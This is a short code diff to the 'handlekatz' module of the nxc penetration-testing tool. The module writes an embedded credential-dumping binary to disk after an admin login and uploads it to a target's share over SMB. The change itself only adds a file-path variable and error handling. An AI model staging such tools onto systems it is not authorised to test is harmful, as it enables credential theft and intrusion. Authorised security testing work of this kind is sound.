@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-# -*- coding: utf-8 -*-
 
 # handlekatz module for nxc python3
 # author of the module : github.com/mpgn
@@ -52,12 +51,19 @@ class NXCModule:
             self.dir_result = module_options["DIR_RESULT"]
 
     def on_admin_login(self, context, connection):
+        handlekatz_loc = self.handlekatz_path + self.handlekatz
+        
         if self.useembeded:
-            with open(self.handlekatz_path + self.handlekatz, "wb") as handlekatz:
-                handlekatz.write(self.handlekatz_embeded)
+            try:
+                with open(handlekatz_loc, "wb") as handlekatz:
+                    handlekatz.write(self.handlekatz_embeded)
+            except FileNotFoundError as e:
+                context.log.fail(f"Handlekatz file specified '{handlekatz_loc}' does not exist!")
+                sys.exit(1)
 
         context.log.display(f"Copy {self.handlekatz_path + self.handlekatz} to {self.tmp_dir}")
-        with open(self.handlekatz_path + self.handlekatz, "rb") as handlekatz:
+
+        with open(handlekatz_loc, "rb") as handlekatz:
             try:
                 connection.conn.putFile(self.share, self.tmp_share + self.handlekatz, handlekatz.read)
                 context.log.success(f"[OPSEC] Created file {self.handlekatz} on the \\\\{self.share}{self.tmp_share}")
